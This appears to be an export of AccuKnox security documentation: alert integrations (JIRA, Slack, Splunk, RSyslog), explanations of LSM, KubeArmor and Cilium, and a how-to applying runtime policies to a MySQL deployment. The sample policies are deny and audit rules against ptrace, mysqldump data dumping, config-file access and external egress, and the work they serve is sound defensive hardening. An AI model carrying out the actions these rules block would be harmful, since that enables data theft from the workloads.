JIRA</li> <li> <p>Enter the following details to configure JIRA.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>Test JIRA</code></li> <li>Site: Enter the site name of your organisation. e.g., <code>https://jiratest.atlassian.net/</code></li> <li>User Email: Enter your Jira account email address here.e.g., <code>jira@organisation.com</code></li> <li>Token: Enter the generated Token here from https://id.atlassian.com/manage-profile/security/api-tokens. .e.g., <code>kRVxxxxxxxxxxxxx39</code></li> <li>User ID: Enter your Jira user ID here. You can visit people section and search your name to see the User ID. For more details check here. e.g., <code>5bbxxxxxxxxxx0103780</code></li> <li>Project ID: Enter your Project key here, each project in an organisation starts with some keyvalue and is case sensitive. Breakdown of a jira ticket to identify Project ID: <code>https://[JIRA-SITE]/browse/[PROJECT ID]-1414</code> , e.g., <code>DEVSECOPS</code></li> <li>Issue Summary: Enter the summary for the JIRA tickets to be viewed in each JIRA tickets created. e.g., <code>Issue generated form High Severity Incidents on onboarded cluster.</code></li> <li>Issue Type: You can choose from the dropdown. i.e., Story and Bug</li> </ul> </li> <li> <p>Click  Test  to check if the entered details are being validated, If you receive Test Successful, you have entered a valid JIRA credentials.</p> </li> <li> <p>Click Save to save the Integration.</p> </li> </ul> <p>You can now configure Alert Triggers for JIRA .</p>"},{"location":"getting-started/k8s-workloads/","title":"Kubernetes Workloads","text":"<p>Accuknox tooling natively supports Kubernetes workloads. Accuknox can connect, query and establish runtime security for K8s workloads seamlessly.</p> <p>Accuknox can enforce k8s security seamlessly and effortlessly with the following features: </p> <ul> <li>automatically discover a given k8s cluster, its pods and resources</li> <li>automatically observe the network and application flows</li> <li>automatically discover policies for individual pods and respective network connections</li> </ul> <p>To support K8s workloads, accuknox components are deployed as a part of a K8s cluster and the components in turn use K8s API to query and interact with the cluster.</p> <p>Accuknox pods are deployed as priviledged containers on all nodes where enforcement must happen.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   k8s</p>"},{"location":"getting-started/lsm-and-kubearmor/","title":"Lsm and kubearmor","text":"<p>Intro to LSM &amp; KubeArmor</p> <p>An LSM is a code compiled directly into the kernel that uses the LSM framework. It\u2019s intended to allow security modules to lock down a system by inserting checks whenever the kernel is about to do something interesting. The security modules hook into those checkpoints, and for each operation, check whether the process is allowed by the security policy currently enforced or not.</p> <p>The LSM framework can deny access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects.</p>"},{"location":"getting-started/lsm-and-kubearmor/#overview-of-lsm-framework","title":"Overview of LSM Framework:","text":"<p>(https://www.ibm.com/developerworks/library/l-selinux/)</p> <p>The LSM framework allows third-party access control mechanisms to be linked into the kernel and modify the default DAC implementation. Hence, KubeArmor connects with Linux security modules (LSMs) so that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor, SELinux, or KRSI) are enabled in the Linux Kernel. Since only a single LSM can be used at a time, they all assumed they had exclusive access to the security context pointers and security identifiers embedded in protected kernel objects; KubeArmor automatically chooses the appropriate LSMs to enforce its required policies.</p> <p>By default, the LSM framework does not provide security but only the infrastructure to support the security modules. It also provides functions to register and un-register security modules.</p>"},{"location":"getting-started/lsm-and-kubearmor/#lsm-security-data-fields","title":"LSM Security Data fields","text":"<p>The LSM framework enables security modules to associate security information with kernel objects. It extends \u201csensitive data types\u201d with opaque data security fields (The security fields are simply void * pointers added in various kernel data structures.)</p> <p></p> <p>\u2022 For process and program, security field added to</p> <p>\u2013 struct task_struct and struct linux_binrpm</p> <p>\u2022 For the File system, the security field added to</p> <p>\u2013 struct super_block</p> <p>\u2022 For pipe, file, and socket, security field added to</p> <p>\u2013 struct inode and struct file</p> <p>\u2022 For packet and network devices, security field added to</p> <p>\u2013 struct sk_buff and struct net_device</p> <p>\u2022 For System V IPC, security field added to</p> <p>\u2013 struct kern_ipc_perm and struct msg_msg</p>"},{"location":"getting-started/lsm-and-kubearmor/#other-lsm-features","title":"Other LSM features","text":"<p>Aside from these hooks and the actions they permit, the LSM framework provides \u201cAudit\u201d functionality which KubeArmor leverages of. They also give alternative ways of generating log files. However, LSMs do not have any container-related information; thus, they create alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID). Therefore, it is hard to figure out what containers cause policy violations. To overcome this, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers and even nodes, and converts system metadata to container/node identities when LSMs generate alerts and system logs for any policy violations from containers and nodes (VMs).</p> <p></p> <p>(High-level overview of KubeArmor &amp; LSM integration)</p> <p>LSM framework also supports the creation of pseudo-filesystems \u2013 to easily interact with the security modules from the user space \u2013 Loading and editing some access rules, reading some audit data, or modifying the module's configurations. </p> <p></p> <p>To enforce security policies at runtime, KubeArmor maintains these policies separately, i.e., security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies to Linux security modules (LSMs) for each container according to the labels of given containers and security policies. Similarly, KubeArmor enforces security policies on nodes (VMs) too.</p>"},{"location":"getting-started/lsm-and-kubearmor/#whats-next","title":"What\u2019s Next?","text":"<p>Kubearmor uses AppArmor and, more recently, added support to SELinux for enforcement. \u201cBPF-LSM\u201d (also referred to as KRSI) support is on the newest future roadmap for KubeArmor. </p> <p>Today the kernel events generated by LSM are resolved at the container level in KubeArmor. E.g., when a process spawns, we know the context from which container it has spawned. But to make the security policy enforcement more robust in the future, we are planning to store the security policies instead in the eBPF map and then link them to container ids, i.e., container-id -&gt; {resource-map}</p> <p>The *resource-ma*p might look something like this:</p> <p>{</p> <p>type [file,process,socket,...],</p> <p>type-related-info,  /* process/file/socket details */</p> <p>fromSource,  /*parent process info - optional */</p> <p>Action,  /* action audit/deny */</p> <p>}</p> <p>Hence, when the LSM hook is called, there shall be a lookup into this map to check if there is a resource match and invoke the action. This would optimize LSM\u2019s calling path and we should see a performance improvement in KubeArmor.</p>"},{"location":"getting-started/open-source-vs-enterprise/","title":"Open source vs Enterprise","text":"<p>Accuknox offers a suite of fully open source tools (CNCF projects, apache license) as well as an enterprise SAAS suite.</p>"},{"location":"getting-started/open-source-vs-enterprise/#open-source-features-include","title":"Open source features include","text":"<ul> <li>Network security using Cilium</li> <li>Application hardening and protection using KubeArmor</li> <li>Auto policy discovery tool</li> <li>Policy templates</li> </ul>"},{"location":"getting-started/open-source-vs-enterprise/#enterprise-features-include","title":"Enterprise features include","text":"<ul> <li>all of the open source feature +</li> <li>Policy recommendations based on workload types</li> <li>Deep learning based anomaly detection for Kubernetes workloads</li> <li>Full gitops workflow integration</li> <li>Multi-tenant, multi-cluster managemnt solution</li> <li>Integrations with AWS Cloudwatch, JIRA, Splunk Enterprise (app), JIRA, ELK, and more.</li> </ul>"},{"location":"getting-started/policy-discovery/","title":"Policy discovery","text":"<p>Developers can discover policies using the policy discovery tool which leads to a detailed policy (per pod in the case of kubernetes) to be generated with the following information:</p> <p>Developers or DevSecOps can enable policy discovery during the development phase, or during a dev environment depening upon how the security posture of the organization is set. Since all policy is generated as code, it can be version controlled and can be introduced in a standard CI/CD pipeline enabling incremental improvements. Developers or SecOps team can chose to have Policy discovery running so that newer policies are continued to be generated as the application continues to run.</p> <p></p> <p>Accuknox provides runtime Kubernetes security using the following underlying technologies: </p> <ul> <li> <p>Linux security modules - AppArmor and SELinux to harden application workloads and restrict the workload from accessing or exhibiting behavior that was not allowed as a part of a security policy.</p> </li> <li> <p>eBPF - Accuknox additionally uses eBPF to both monitor application level system calls to provide runtime observability as well as provide L3, L4 and L7 security.</p> </li> </ul>"},{"location":"getting-started/policy-discovery/#accuknox-provides-the-following-runtime-security","title":"Accuknox provides the following runtime security","text":""},{"location":"getting-started/rsyslog-integration/","title":"RSyslog","text":""},{"location":"getting-started/rsyslog-integration/#rsyslog-integration","title":"RSyslog Integration","text":"<p>To forward the events to RSyslog  you must first set up the RSyslog Integration.</p>"},{"location":"getting-started/rsyslog-integration/#integration-of-rsyslog","title":"Integration of RSyslog:","text":""},{"location":"getting-started/rsyslog-integration/#a-prerequisites","title":"a. Prerequisites:","text":"<ul> <li>A running RSyslog server.</li> <li>Host name/IP, Port number, Transport type(TCP or UDP) </li> </ul> <p>Note: To deploy RSyslog server , RSyslog Documentation  .</p>"},{"location":"getting-started/rsyslog-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Settings \u2192 Integrations \u2192 CWPP(Tab).</li> <li>Click integrate now on RSyslog.</li> <li>Fill up the following fields:</li> <li> <p>Integration Name: Enter the name for the integration. You can set any name of your choice.    e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Server Address: Enter your RSyslog Server address here, IP address or fully qualified domain name (FQDN) of the RSyslog server    e.g., <code>rsyslog.mydomain.com</code> or <code>35.xx.xx.xx</code></p> </li> <li> <p>Port: The port number to use when sending RSyslog messages (default is UDP on port 514); you must use the same port number.     e.g., <code>514</code></p> </li> <li> <p>Transport: Select UDP, or TCP as the method of communication with the RSyslog server</p> </li> <li> <p>Click  Test  to check the new functionality, You will receive the test message on configured RSyslog Server.  -<code>Test message Please ignore !!</code></p> </li> <li>Click Save to save the Integration. You can now configure Alert Triggers for RSyslog Events</li> </ul>"},{"location":"getting-started/security-policy-as-code/","title":"Policy using GitOps Workflow","text":"<p>Accknox enables DevSecOps teams to embed security policies as code into their GitOps workflow. This provides a unified, collaborative view of the policies and enables them to be shipped and deployed along with the applications they are protecting. So instead of needing to separately configure perimeter or host firewall rules, AccuKnox leverages Kubernetes to apply them at the pod and host level as deployments change.</p> <p>AccuKnox uses Cilium and KubeArmor to enforce policies for Network and Application security at runtime. Both tools use either Yaml or JSON files as their policy definition language to apply rules for runtime security.</p>"},{"location":"getting-started/security-policy-as-code/#sample-application-policy","title":"Sample Application Policy","text":"<p>Below is a sample KubeArmor policy that blocks access to the ptrace process:</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-mitre-ptrace-syscall\nspec:\ntags: [\"MITRE\", \"T1055.008\", \"Privilege Escalation\", \"P-trace\"]\nmessage: \"Alert! ptrace access denied\"\nnodeSelector:\nmatchLabels:\nkubernetes.io/hostname: gke-ubuntu # Change your match labels\nfile:\nseverity: 6\nmatchPaths:\n- path: /proc/sys/kernel/yama/ptrace_scope\n- path: /etc/sysctl.d/10-ptrace.conf\naction: Block\n</code></pre>"},{"location":"getting-started/security-policy-as-code/#sample-network-policy","title":"Sample Network Policy","text":"<p>Below is a sample Cilium poloicy that denies access to helm tiller endpoint:</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"cnp-ingress-mitre-t1210-block-helm-tiller-endpoint\"\nspec:\ndescription: \"Policy to Deny Access to tiller endpoint on port 44134\"\nendpointSelector:\nmatchLabels:\napp: test #change app: test to match your label\ningressDeny:\n- toPorts:\n- ports:\n- port: \"44134\"\nprotocol: ANY\n</code></pre> <p>Note, KubeArmor provides numerous open source policy templates to help you get started with monitoring and enforcing compliance and security. To learn more about policy templates:  Visit the GitHub policy template repository Examples include CIS, NIST, PCI and support, several different languages and application examples.</p>"},{"location":"getting-started/slack-integration/","title":"Slack","text":""},{"location":"getting-started/slack-integration/#slack-integration","title":"Slack Integration","text":"<p>To send an alert notification via Slack you must first set up the Slack notification Channel.</p>"},{"location":"getting-started/slack-integration/#integration-of-slack","title":"Integration of Slack:","text":""},{"location":"getting-started/slack-integration/#a-prerequisites","title":"a. Prerequisites:","text":"<ul> <li>You need a valid and active account in Slack.</li> <li>After logging into your Slack channel, you must generate a Hook URL.</li> </ul> <p>Note : To generate Hook URL  follow the steps, Webhooks-for-Slack .</p>"},{"location":"getting-started/slack-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on Slack.</li> <li>Fill up the following fields:</li> <li> <p>Integration Name: Enter the name for the integration. You can set any name.    e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Hook URL: Enter your generated slack hook URL here.    e.g., <code>https://hooks.slack.com/services/T000/B000/XXXXXXX</code></p> </li> <li> <p>Sender Name: Enter the sender name here.     e.g., <code>AccuKnox User</code></p> </li> <li> <p>Channel Name: Enter your slack channel name here.          e.g., <code>livealertsforcontainer</code></p> </li> <li> <p>Click  Test  to check the new functionality, You will receive the test message on configured slack channel.  -<code>Test message Please ignore !!</code></p> </li> <li>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</li> </ul>"},{"location":"getting-started/splunk-integration/","title":"Splunk","text":""},{"location":"getting-started/splunk-integration/#splunk-integration","title":"Splunk Integration","text":"<p>Splunk is a software platform to search, analyze, and visualize machine-generated data gathered from websites, applications, sensors, and devices.</p> <p>AccuKnox integrates with Splunk and monitors your assets and sends alerts for resource misconfigurations, compliance violations, network security risks, and anomalous user activities to Splunk. To forward the events from your workspace you must have Splunk Depolyed and HEC URL generated first for Splunk Integration.</p>"},{"location":"getting-started/splunk-integration/#integration-of-splunk","title":"Integration of Splunk:","text":""},{"location":"getting-started/splunk-integration/#a-prerequisites","title":"a. Prerequisites:","text":"<p>Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols. </p> <ul> <li> <p>To set up HEC, use instructions in  Splunk documentation.        For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here.</p> </li> <li> <p>Select Settings &gt; Data inputs &gt; HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled .</p> </li> </ul>"},{"location":"getting-started/splunk-integration/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on Splunk.</li> <li>Enter the following details to configure Splunk.</li> <li> <p>Select the Splunk App : From the dropdown, Select Splunk Enterprise.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>Test Splunk</code></li> <li>Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier.e.g., <code>https://splunk-xxxxxxxxxx.com/services/collector</code></li> <li>Index: Enter your Splunk Index, once created while creating HEC. e.g., <code>main</code></li> <li>Token: Enter your Splunk Token, generated while creating HEC URL. e.g., <code>x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000</code></li> <li> <p>Source: Enter the source as <code>http:kafka</code></p> </li> <li> <p>Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g., <code>_json</code></p> </li> <li>Click  Test  to check the new functionality, You will receive the test message on configured slack channel. e.g.,<code>Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials</code></li> </ul> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</p> </li> </ul>"},{"location":"getting-started/technology/","title":"AppArmor, SELinux and eBPF","text":"<p>Accuknox offers runtime protection for your Kubernetes and other cloud workloads is provided using Kernel Native Primitives such as </p> <ul> <li> <p>eBPF for Networking (L3, L4 and L7 security) and observability</p> </li> <li> <p>Linux Security Modules (LSM)  - Accuknox uses AppArmor and SELinux both are active Linux Security Modules for application hardening and security at runtime.</p> </li> </ul> <p>Both eBPF and Linux Security Modules (LSMS) are well known approaches to hardening / protecting workloads running in Linux. </p>"},{"location":"getting-started/technology/#kubearmor","title":"KubeArmor","text":"<p>KubeArmor is an open source application hardening and runtime security solution for Cloud Native workloads. https://github.com/accuknox/KubeArmor</p> <p>KubeArmor uses Linux Security Modules (LSMs \u2013 AppArmor or SELinux to enforce application security), Syscall Filtering and soon eBPF LSMs to support hardening of a given process or container while interacting with the host, resources or other processes locally or across the network.</p> <p>Additionally, KubeArmor produces alert logs for policy violations that happen in containers by monitoring the operations of containers\u2019 processes using its eBPF-based system monitor.</p> <p>KubeArmor allows operators to define security policies based on Kubernetes metadata and simply apply them into Kubernetes.</p> <p>Additionally KubeArmor supports virtual machine and baremetal workloads at this moment of time.</p>"},{"location":"getting-started/technology/#cilium-cni","title":"Cilium CNI","text":"<p>Cilium is an open source project to provide networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms [1]. Cilium uses eBPF which is a Linux kernel technology that allows dynamic inserts of a program (called eBPF program) to be safely executed into Linux kernel. Cilium operates as a CNI (\u200b\u200bContainer Networking Interface) running in each node of the cluster.</p>"},{"location":"getting-started/technology/#auto-policy-discovery","title":"Auto Policy Discovery","text":"<p>The auto policy discovery is a fully open source component that can fully automatically discover the security profile of your application by observing it in a given environment. </p>"},{"location":"getting-started/vm-baremetal/","title":"VM / Baremetal Workloads","text":"<p>Accuknox cloud security tools also supports virtual machine and baremetal workloads with the help of KVMservice.</p> <p>Accuknox can enforce virtual machine and baremetal policies security seamlessly and effortlessly with the following features: </p> <ul> <li>discovery of virtual machines / baremetals with the agent installation</li> <li>discovery of processes within the virtual machines </li> <li>automatically discover policies for individual processes or for the entire host.  </li> </ul> <p>Accuknox components including VM specific components are deployed as a part of a VM cluster as daemons, on all nodes where enforcement must happen.</p>"},{"location":"getting-started/vm-onboarding/","title":"Vm onboarding","text":"<p>This document is in progress and will be updated soon.</p>"},{"location":"getting-started/what-is-runtime-security/","title":"Defining runtime security","text":"<p>Runtime security is the protection of workloads against active threats and malicious behavior once the workloads have been initialized and are running. </p> <p>Accuknox provides framework and tools for Runtime Security for Kubernetes, Containerised and VM/Bare-Metal based workloads.</p> <p>In the case of a Kubernetes pods, runtime is the state that when the pod has come to a running state - this happens after image scanning of the containers, after the patching has been done, after admission controller has allowed for the deployment of the pods.</p> <p>When the pod has actually begun to run and interact with its host operating system requesting for resources and communicating via the network is when it can be defined as it currently running. And any security solution that monitors and continously protects the workloads in a runtime state is called a runtime security solution.  To understand what is runtime security and what we do, lets look at the following illustration:</p> <p></p> <p>When a workload is running, it communicates through its library (java, golang, python..) to the kernel. These calls get converted to syscalls. These syscall events when filtered in the order of relevance can be categorized broadly into the following (not an existive) type of features:</p> <ul> <li>Application interaction with the OS and other processes including - workloads forking process, establishing new network connections and accessing files.</li> <li>Network connections can be further categorized into  L3, L4 and L7 connections.</li> <li>Request for specific capabilities</li> </ul> <p>A runtime security solution is able to provide full visibility into all of these application interactions with the host kernel and provide the ability to filter or restrict specific actions at runtime.</p> <p>With Accuknox you can automatically discover the application interaction and network interaction in the form of policy as code subsequently these policies can be audited or enforced at runtime giving you the ability to restrict specific behaviors of the application.</p> <p>For example you could have a policy that says</p> <ul> <li>Pod A cannot access <code>/etc/bin</code> folder</li> <li>Pod B cannot initiate ptrace i.e. trace the execution of other processes</li> <li>Pod C cannot communicate to a remote TCP server running on port 5000.</li> </ul> <p>This list can be as exhaustive as you like, and these policies are enforced within the kernel using kernel primitives and technologies as listed below:</p>"},{"location":"getting-started/what-is-runtime-security/#application-security-using-kubearmor","title":"Application security using KubeArmor","text":"<ul> <li>The Linux Security Module (LSM) framework provides a mechanism for various security checks to be hooked by new kernel extensions. It denies access to essential kernel objects, such as files, inodes, task structures, credentials, and inter-process communication objects.</li> <li>AccuKnox supports AppArmor, SELinux and BPF-LSM as of today for its enforcement engine at runtime.</li> </ul>"},{"location":"getting-started/what-is-runtime-security/#network-security-using-cilium","title":"Network Security using Cilium","text":"<ul> <li>Network runtime protection in the form of L3, L4 and L7 rules using identity (x509 certificates or K8s labels) for your K8s workloads. In K8s policies this is implemented as a CNI using Cilium.</li> <li>For Virtual Machine workloads, labels are used to provide host level network policies for L3, L4 and L7.</li> </ul>"},{"location":"getting-started/what-is-the-problem-accuknox-solves/","title":"What is the problem that Accuknox solves?","text":"<p>Modern Kubernetes and other cloud applications include: </p> <ul> <li>Dozens of open source libraries, all of which come with inherent supply chain risks; Example a recent study found that more than half the docker images had some vulnerability. </li> <li>It is not entirely common but sometimes unpatched vulnerabilities, or misconfigurations slip through in production</li> <li>Zero-day attacks that create chaos as workloads can be compromised until a patch has been applied..</li> </ul> <p>In such a scenario, applications can be compromised and once they are, they can initiate a wide range of malicious activity even if not running as a root.</p> <p>Accuknox provides runtime security for your Kubernetes workloads to prevent malicious activity as determined by MITRE and other indicators of compromise and stops your workload from behaving maliciously at runtime. This gives you the necessary guardrails to restrict application behavior within a set of predefined policies while you apply a patch. Unlike traditional solutions that recommend a full quarantine of the workloads, accuknox's runtime solution can provide you active runtime protection allowing you to only restrict the malicious behavior as opposed to the entire workload.</p>"},{"location":"getting-started/workspace-manager/","title":"Workspace manager","text":""},{"location":"getting-started/workspace-manager/#workspace-manager-in-accuknox","title":"Workspace Manager in AccuKnox","text":"<p>The workspace manager allows enterprise users to manage their multi-tenant clusters, user and user onboarding, onboard new clusters and manage enterprise integrations.</p> <p>With workspace manager one can,</p> <ol> <li>Manage Users and their onboarding</li> <li>Enable / Disable or create granular Role-Based Access Controls (RBAC)</li> <li>Onboard New Clusters</li> <li>Configure Channel Integrations </li> </ol>"},{"location":"how-to/ensure-policies-will-not-break-application/","title":"How to ensure enforcing policies will not break my application?","text":""},{"location":"how-to/ensure-policies-will-not-break-application/#introduction","title":"Introduction","text":"<p>When we using KubeArmor and Cilium policies to allow the functionality of particular functions in deployment. These policies should not obstruct the deployment process and our application should work as intended without any disturbance with applied policies.</p> <p>AccuKnox provides fine-grained access control for workloads at runtime allowing DevSecOps to control what resources, files, networks, and processes a workload can access. With AccuKnox the DevSecOps can create runtime policies to make sure always verify and never trust that's how zero trust model can be created. AccuKnox allows SecOps to restrict the following types of behavior on the cloud workloads. File access - A typical file access by a process or a network can be allowed or denied on specific paths - Process execution - The ability to allow or deny a Process execution or forking can be achieved for specific processes or all the processes on a       directory - Network connection - It is easy to allow or deny any network-based communication from a workload using AccuKnox. The requests can be TCP, UDP, or even ICMP packets can be denied or allowed. - Capabilities - A workload can share the capabilities of the host if and when allowed. Such capabilities can enable additional types of malicious behavior. With AccuKnox we can allow or deny workloads to request other capabilities with the host OS.</p> <p>For example,An online book-store app made with MySQL as a database. Scenerio is we want to keep the logs from being exposed to the public and also allowing them to function. We need to develop regulations that merely block the exposure, not the entire functionality. We'll go over how to construct rules with suitable permissions and use cases in this document.</p>"},{"location":"how-to/ensure-policies-will-not-break-application/#sample-application-deployment","title":"Sample Application Deployment","text":"<p>AccuKnox sample library has various deployments for your needs to deploy vulnerable applications and use cases and Proof-of-concept, etc., Check out here. AccuKnox maintains repository that contains various sample deployment that one can use to play with for various PoC scenarios.</p> <p>In this use case we are going to deploy an Online Book Store app made with mysql deployment.</p> <p>To create this mysql deployment into your cluster run this below command:</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/OnlineBookStore/mysql-deployment.yaml\n</code></pre> <p>Output:</p> <pre><code>service/mysql created\ndeployment.apps/mysql created\npersistentvolume/mysql-pv-volume created\npersistentvolumeclaim/mysql-pv-claim created\n</code></pre> <p>Deployment state:</p> <pre><code>NAME                         READY   STATUS    RESTARTS   AGE\npod/mysql-68579b78bb-rttvt   1/1     Running   0          24s\n\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE\nservice/kubernetes   ClusterIP   10.44.0.1    &lt;none&gt;        443/TCP    3h3m\nservice/mysql        ClusterIP   None         &lt;none&gt;        3306/TCP   27s\n\nNAME                    READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/mysql   1/1     1            1           26s\n\nNAME                               DESIRED   CURRENT   READY   AGE\nreplicaset.apps/mysql-68579b78bb   1         1         1       26s\n</code></pre>"},{"location":"how-to/ensure-policies-will-not-break-application/#policy-templates","title":"Policy-Templates","text":"<p>AccuKnox policy-templates  includes ready-made policy templates for all of our needs, from NIST, PCI-DSS, and STIG compliances to all CVEs and everything in between. That is the repository we will use in our use case. Check out policy-template for further information.</p>"},{"location":"how-to/ensure-policies-will-not-break-application/#policy-creation","title":"Policy Creation","text":"<p>To apply this KubeArmor Policy run this below command:</p> <p>[Note: matchLabels and namespace may vary check with your deployment]</p> <ol> <li>In this policy we are going to audit the config files for any unusual activity.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml\n</code></pre> <p>Policy YAML:</p> <pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at run-time.\n# To learn more about KubeArmor visit:\n# https://www.accuknox.com/kubearmor/\n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-restrict-access-mysql-server-config\nnamespace: default # Change your namespace\nspec:\ntags: [\"MYSQL\", \"config-files\", \"mysqldump\"]\nmessage: \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\"\nselector:\nmatchLabels:\napp: mysql8 # Change your labels\nfile:\nseverity: 5\nmatchPaths:\n- path: /etc/mysql/my.cnf\nownerOnly: true\nmatchDirectories:\n- dir: /etc/mysql/\nrecursive: true\nownerOnly: true\n- dir: /var/lib/mysql/\nreadOnly: true\nrecursive: true\n- dir: /var/log/mysql/\nrecursive: true\naction: Audit\nprocess:\nseverity: 10\nmatchPaths:\n- path: /usr/bin/mysqldump\naction: Block\n</code></pre> <p>In our policy we have mentioned the:</p> <pre><code>- dir: /var/lib/mysql/\nreadOnly: true\nrecursive: true\n</code></pre> <p><code>readOnly: true</code> this rule will give appropriate permissions to the deployed application.  \\ So we can stop the logs from exposing and also our policy won\u2019t break the applications functionality.</p> <ol> <li>In this policy we are going to protect the mysqldump to get accessed and to apply this policy run this command.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml\n</code></pre> <p>Policy YAML:</p> <pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at run-time.\n# To learn more about KubeArmor visit:\n# https://www.accuknox.com/kubearmor/\n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-block-mysql-dump-in-pods\n  namespace: default        # Change your namespace\nspec:\n  tags: [\"mysql\",\"system\",\"K8s\"]\nmessage: \"Warning! MySQLdump is blocked\"\nselector:\n    matchLabels:\n      app: testpod    #change with your own label\nprocess:\n    matchPaths:\n    - path: /usr/bin/mysqldump\n    action: Block\n    severity: 6\n</code></pre> <ol> <li>In this policy we are protecting the configuration files from exposure. To apply the policy run this below command.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml\n</code></pre> <p>Policy YAML:</p> <pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at run-time.\n# To learn more about KubeArmor visit:\n# https://www.accuknox.com/kubearmor/\n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-block-stigs-mysql-config-directory-access\n  namespace: default # Change your namespace\nspec:\n  tags: [\"STIGS\", \"MYSQL\"]\nmessage: \"Alert! Access to mysql conf files has been denied\"\nselector:\n    matchLabels:\n      pod: mysql-1 # Change your match labels\nfile:\n    severity: 5\nmatchDirectories:\n    - dir: /etc/mysql/\n      recursive: true\nownerOnly: true\n- dir: /usr/lib/mysql/\n      recursive: true\nownerOnly: true\n- dir: /usr/share/mysql/\n      recursive: true\nownerOnly: true\n- dir: /var/lib/mysql/\n      recursive: true\nownerOnly: true\n- dir: /var/log/mysql/\n      recursive: true\nownerOnly: true\n- dir: /usr/local/mysql/\n      recursive: true\nownerOnly: true\naction: Block\n</code></pre> <ol> <li>In this Cilium policy we are going to protect the unused ports from accessing the workloads. To apply the policy run this below command.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml\n</code></pre> <p>Policy YAML:</p> <pre><code># https://www.stigviewer.com/stig/oracle_mysql_8.0/2021-12-10/finding/V-235146\n\napiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: cnp-mysql-stig-v-235146\nnamespace: default        #change default namespace to match your namespace\nspec:\ndescription: \"Restrict access to unused ports\"\nendpointSelector:\nmatchLabels:\napp: mysql #change label app: mysql with your own labels.\ningress:\n- fromEndpoints:\n- {}\ntoPorts:\n- ports:\n- port: \"3306\"\n- ports:\n- port: \"33060\"\n</code></pre> <ol> <li>In this cilium policy we are protecting from external access to our mysql workload. To apply the policy run the below command.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml\n</code></pre> <p>Policy YAML:</p> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: cnp-egress-deny-external-communication-from-mysql-pod\nnamespace: default        #change default namespace to match your namespace\nspec:\ndescription: \"To block all external world communication from mysql pod and limit it to specific pods\"\nendpointSelector:\nmatchLabels:\napp: mysql      #change app: mysql to match your label\negressDeny:\n- toEntities:\n- \"world\"\negress:\n- toEndpoints:\n- matchLabels:\napp: frontend   #change app: frontend to match your label\n</code></pre> <p>Verification: After applying multiple policies from policy-template our deployment is still running and without any issues</p> <pre><code>\u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml\nkubearmorpolicy.security.kubearmor.com/ksp-restrict-access-mysql-server-config unchanged\n\u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/system/ksp-block-mysql-dump-in-pods.yaml\nkubearmorpolicy.security.kubearmor.com/ksp-block-mysql-dump-in-pods unchanged\n\u276f kubectl apply -f 